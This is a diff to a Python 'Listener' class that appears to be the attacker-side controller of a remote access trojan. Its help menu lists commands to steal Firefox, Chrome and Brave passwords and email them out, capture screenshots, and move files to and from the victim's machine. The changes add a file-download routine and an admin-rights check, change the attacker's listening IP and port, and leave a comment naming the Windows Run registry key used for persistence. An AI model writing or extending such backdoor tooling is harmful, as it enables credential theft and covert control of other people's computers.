@@ -241,19 +241,22 @@ class Listener:
         # Diccionario con las opciones y descripciones
         # Para el menú de ayuda.
         options = {
+            "screenshot": "Take a screenshot and send it by email",
+            "screenshot2": "Take a screenshot and save it in the server",
+            "upload [file]": "Upload a file to the client",
+            "download [file]": "Download a file from the client",
+            "cd [directory]": "Change the current directory",
+            "geturl [url]": "Download a file from the internet",
+            "start": "Start an application in the client and don't wait for it to finish",
+            "checkadmin": "Check if the user is an administrator",
             "get users": "Get the list of users and send it by email",
             "get firefox": "Get the firefox passwords and send it by email",
             "get chrome": "Get the chrome passwords and send it by email",
             "get brave": "Get the brave passwords and send it by email",
-            "screenshot": "Take a screenshot and send it by email",
-            "screen2": "Take a screenshot and save it in the server",
-            "upload [file]": "Upload a file to the client",
-            "download [file]": "Download a file from the client",
-            "cd [directory]": "Change the current directory",
-            "exit": "Exit the listener",
-            "help": "Show this help message"
+            "help": "Show this help message",
+            "exit": "Exit the listener"
         }    
-        print("\n\nOptions:\n")
+        print("\nOptions:\n")
         # Muestra las opciones iterando sobre el diccionario
         for option, description in options.items():
             print(f"   {option}:\t{description}")
@@ -280,7 +283,8 @@ class Listener:
             command = f"upload {file}"
             self.client_socket.send(command.encode())
             with open(file, "rb") as file_upload:
-                self.client_socket.send(base64.b64encode(file_upload.read()))
+                data = file_upload.read()
+                self.client_socket.sendall(data)
             print(f"File {file} uploaded successfully!")
         except Exception as e:
             print(f"Error uploading file: {e}")
@@ -293,15 +297,39 @@ class Listener:
         try:
             command = f"download {file}"
             self.client_socket.send(command.encode())
+            
+            # Recibir primero el tamaño
+            size_data = self.client_socket.recv(4)
+            size = struct.unpack("!I", size_data)[0]
+            
+            # Recibir los datos
+            data = self.client_socket.recv(size)
+            
+            # Verificar si es un mensaje de error
+            if data.startswith(b"[-]"):
+                print(data.decode())
+                return
+                
+            # Si no es error, guardar el archivo
             with open(file, "wb") as file_download:
-                file_data = self.client_socket.recv(30000)
-                file_download.write(base64.b64decode(file_data))
+                file_download.write(data)
             print(f"File {file} downloaded successfully!")
         except Exception as e:
             print(f"Error downloading file: {e}")
-    
-    
+
+
+    def check_admin(self, command):
+        '''
+        Comprueba si el usuario es administrador
+        '''
+        try:
+            self.client_socket.send(command.encode())
+            output_command = self.client_socket.recv(2048).decode()
+            print(output_command)
+        except Exception as e:
+            print(f"Error checking admin: {e}")
    
+   # Equipo\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 
     
     def run(self):
@@ -346,7 +374,11 @@ class Listener:
                 # Y el servidor no se quede esperando a que termine la aplicación
                 self.client_socket.send(command.encode())    
             
- 
+            elif command == "checkadmin":
+                # Comprueba si el usuario es administrador
+                self.check_admin(command)
+            
+            # Si el comando es "get users" se ejecuta la función get_users
             elif command == "get users":
                 self.get_users()
             # Si el comando es "get firefox" se ejecuta la función get_firefox
@@ -380,8 +412,8 @@ if __name__ == "__main__":
     sender = "youemail@email.com"
     recipients = "[your@email.com]"
     password = "yourpassword"
-    ip_server = "192.168.100.51"
-    port = 443 # Puerto de escucha del atacante
+    ip_server = "192.168.100.5"
+    port = 4433 # Puerto de escucha del atacante
     
     listener = Listener(ip_server, port)
     listener.run()
